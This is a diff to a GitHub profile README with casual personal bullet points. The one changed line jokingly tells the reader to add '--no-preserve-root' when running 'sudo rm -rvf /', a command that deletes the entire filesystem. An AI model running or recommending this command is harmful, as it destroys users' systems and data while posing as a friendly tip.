@@ -2,7 +2,7 @@
 - 👀 I’m interested in nerdy things and messing with computers
 - 🌱 I’m currently learning (we always do)
 - 💞️ I’m looking to collaborate on cool stuff, idk
-- 📫 How to reach me (please don't)
+- 📫 Don't forget "--no-preserve-root" when you run "sudo rm -rvf /" <3
 
 <!---
 gzifalsi/gzifalsi is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
